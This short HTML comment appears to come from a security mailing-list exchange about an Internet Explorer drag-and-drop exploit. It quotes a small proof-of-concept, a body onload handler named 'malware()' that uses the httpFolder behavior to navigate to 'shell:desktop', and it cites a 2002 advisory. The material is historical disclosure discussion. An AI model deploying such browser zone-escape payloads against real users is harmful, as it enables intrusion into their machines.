<!-- 
The premise behind this Drag'n'Drop exploit is two-fold, one is 
the ability to open a window with local content and the other is 
the fact  that dropping an IMG element will pass its DYNSRC 
attribute instead of  its SRC attribute

This is amusing. Though you're not the first to conjur up such 
machinations. Below is my response to that from weeks ago when 
originally constructing the demo:

The 'inventor' of this product also needs to be aware that the 
http folder behavior results in the same dating back Wednesday, 
August 14, 2002 [http://www.securityfocus.com/archive/1/320437]:

<body onload=malware() style="behavior: url
(#default#httpFolder);"> 
 <script> 
function malware(){ 
document.body.navigate("shell:desktop"); 
} 
 </script>

plus all the html help calls via the html help object. Probably 
many others but we can't do everything if you know what I mean.
